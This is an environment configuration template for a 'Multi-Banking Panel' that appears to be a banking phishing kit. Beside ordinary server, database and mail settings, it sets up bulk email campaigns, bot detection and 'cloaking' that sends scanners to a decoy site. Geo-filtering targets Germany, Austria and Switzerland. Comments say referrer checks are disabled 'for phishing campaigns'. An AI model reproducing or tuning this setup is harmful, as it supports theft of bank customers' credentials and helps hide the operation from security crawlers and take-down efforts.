# Multi-Banking Panel - Environment Configuration Template
# Copy this file to .env and fill in your actual values

# ==============================================
# MAIN SERVER CONFIGURATION
# ==============================================

# Security Configuration
JWT_SECRET=your-super-secure-jwt-secret-here-min-32-characters
ADMIN_USERNAME=admin
ADMIN_PASSWORD=your-secure-admin-password
ADMIN_EMAIL=admin@yourdomain.com

# Database Configuration
DB_PATH=./data/database.sqlite

# Server Configuration
PORT=3001
NODE_ENV=development
SERVER_URL=http://localhost:3001

# CORS Configuration (comma-separated origins)
CORS_ORIGIN=http://localhost:5173,http://localhost:5174

# Rate Limiting
RATE_LIMIT_WINDOW_MS=900000
RATE_LIMIT_MAX_REQUESTS=100

# Email Configuration (SMTP)
EMAIL_HOST=smtp.example.com
EMAIL_PORT=587
EMAIL_SECURE=false
EMAIL_USER=your-email@example.com
EMAIL_PASS=your-email-password
EMAIL_FROM=no-reply@multibanking-panel.com

# File Upload Configuration
UPLOAD_DIR=./uploads
MAX_FILE_SIZE=10485760
ALLOWED_FILE_TYPES=image/jpeg,image/png,application/pdf

# Session Configuration
SESSION_SECRET=your-session-secret-here-min-32-characters
SESSION_EXPIRE_HOURS=24

# ==============================================
# MAILER SERVICE CONFIGURATION
# ==============================================

# Mailer Service Settings
MAILER_PORT=3002
MAILER_JWT_SECRET=your-mailer-jwt-secret-here-min-32-characters

# Resend API Configuration
RESEND_API_KEY=your-resend-api-key-here

# Campaign Configuration
CAMPAIGN_BATCH_SIZE=100
CAMPAIGN_RATE_LIMIT=10

# ==============================================
# SECURITY SETTINGS
# ==============================================

# Encryption Keys (for sensitive data)
ENCRYPTION_KEY=your-32-character-encryption-key-here
ENCRYPTION_IV=your-16-character-iv-here

# Security Headers
TRUST_PROXY=false
TRUSTED_PROXIES=

# Anti-Bot Configuration
ENABLE_ANTIBOT=true
ANTIBOT_HEADER_THRESHOLD=5

# Geo-filtering
ENABLE_GEO_FILTER=false
ALLOWED_COUNTRIES=DE,AT,CH

# ==============================================
# DEVELOPMENT SETTINGS
# ==============================================

# Logging
LOG_LEVEL=info
LOG_FILE=./logs/app.log

# Debug Settings
DEBUG_MODE=false
VERBOSE_LOGGING=false

# ==============================================
# PRODUCTION OVERRIDES
# ==============================================

# SSL Configuration
SSL_ENABLED=false
SSL_CERT_PATH=
SSL_KEY_PATH=

# Database Connection Pool
DB_CONNECTION_LIMIT=10
DB_TIMEOUT=30000

# Monitoring
HEALTH_CHECK_ENABLED=true
METRICS_ENABLED=false

# ==============================================
# ANTI-BOT & SECURITY CONFIGURATION
# ==============================================

# Anti-Bot Protection
ENABLE_ANTIBOT=true                          # Master switch for anti-bot protection
ANTIBOT_HEADER_THRESHOLD=4                   # Scoring threshold (4 = balanced, lower = stricter)
CRAWLER_PATTERNS_PATH=./src/data/crawler-user-agents.json

# Cloaking (Decoy Site)
ENABLE_CLOAKING=true                         # Redirect detected bots to portfolio site
ENABLE_SCHEDULED_CLOAKING=false              # Time-based hiding (business hours only)
SCHEDULED_HOURS=9-17                         # Active hours if scheduled mode enabled

# Geo-Filtering
ENABLE_GEO_FILTER=false                      # Block visitors from outside target countries
ALLOWED_COUNTRIES=DE,AT,CH                   # Comma-separated country codes (German-speaking)

# Referrer Check (usually disabled for phishing campaigns)
ENABLE_REFERRER_CHECK=false                  # Validate HTTP referrer headers
ALLOWED_REFERRERS=                           # Comma-separated allowed referrer domains
ALLOW_EMPTY_REFERRER=true                    # Allow requests with no referrer (most phishing links)
